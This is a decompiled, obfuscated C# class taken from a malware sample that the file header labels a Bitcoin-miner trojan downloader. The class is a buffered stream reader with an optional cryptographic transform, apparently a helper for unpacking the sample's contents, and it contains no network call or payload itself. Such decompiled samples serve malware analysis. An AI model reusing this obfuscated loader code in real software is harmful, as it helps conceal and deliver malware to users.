﻿// Decompiled with JetBrains decompiler
// Type: .
// Assembly: WindowsBC, Version=1.0.0.0, Culture=neutral, PublicKeyToken=9909ee17073e3364
// MVID: 658BFC85-36E1-493D-98E6-AE9127D73D60
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.BitCoinMiner.c-64f742a0b28b2c3d2a62ef6607fcfd5fa55b793a1aff3a6c11e014e3b119149e.exe

using \u0017\u0002;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u000E\u0002
{
  internal sealed class \u0016\u0002
  {
    private int \u0001;
    private byte[] \u0002;
    private int \u0003;
    private byte[] \u0004;
    private int \u0005;
    private ICryptoTransform \u0006;
    private Stream \u0007;

    public \u0016\u0002([In] Stream obj0, [In] int obj1)
    {
      this.\u0007 = obj0;
      if (obj1 < 1024)
        obj1 = 1024;
      this.\u0002 = new byte[obj1];
      this.\u0004 = this.\u0002;
    }

    [SpecialName]
    public int \u0084\u0004() => this.\u0001;

    [SpecialName]
    public int \u0086\u0004() => this.\u0005;

    public void \u0087\u0004([In] \u0013 obj0)
    {
      if (this.\u0005 <= 0)
        return;
      obj0.\u001A\u0003(this.\u0004, this.\u0003 - this.\u0005, this.\u0005);
      this.\u0005 = 0;
    }

    public void \u009C\u0003()
    {
      this.\u0001 = 0;
      int num;
      for (int length = this.\u0002.Length; length > 0; length -= num)
      {
        num = \u0089\u0005.\u007E\u000F\u0005((object) this.\u0007, this.\u0002, this.\u0001, length);
        if (num > 0)
          this.\u0001 += num;
        else
          break;
      }
      this.\u0003 = this.\u0006 == null ? this.\u0001 : \u0094\u0003.\u007E\u0099\u0005((object) this.\u0006, this.\u0002, 0, this.\u0001, this.\u0004, 0);
      this.\u0005 = this.\u0003;
    }
  }
}